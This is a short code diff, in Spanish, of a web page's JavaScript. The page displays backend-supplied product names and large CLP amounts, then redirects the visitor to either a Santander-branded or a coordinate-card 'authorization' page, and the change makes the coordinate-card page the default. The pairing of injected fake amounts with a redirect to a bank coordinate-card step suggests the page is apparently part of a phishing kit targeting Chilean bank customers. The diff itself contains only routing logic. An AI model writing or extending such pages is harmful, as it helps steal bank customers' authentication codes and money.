@@ -74,7 +74,7 @@
       }).format(valor);
     }
 
-    let tipoAutorizacion = "santander"; // valor por defecto
+    let tipoAutorizacion = "coordenadas"; // valor por defecto
 
     document.addEventListener("DOMContentLoaded", () => {
       // Obtener configuración desde el backend
@@ -86,7 +86,8 @@
           document.getElementById("producto2").innerText = data.producto2 || "Tarjeta de Crédito WorldMember Limited Business";
           document.getElementById("monto2").innerText = formatoCLP(data.monto2 || 5000000);
 
-          tipoAutorizacion = data.tipoAutorizacion || "santander";
+          // Solo dos tipos válidos: coordenadas o santander
+          tipoAutorizacion = data.tipoAutorizacion || "coordenadas";
         })
         .catch(err => {
           console.error("Error al cargar configuración:", err);
@@ -107,10 +108,10 @@
       document.getElementById("mensaje").innerText = "Serás redirigido al área de autorización...";
 
       setTimeout(() => {
-        if(tipoAutorizacion === "santander"){
-          window.location.href = "autorizacion-santander.html";
-        } else {
+        if(tipoAutorizacion === "coordenadas"){
           window.location.href = "autorizacion-coordenadas.html";
+        } else {
+          window.location.href = "autorizacion-santander.html";
         }
       }, 2000);
     });
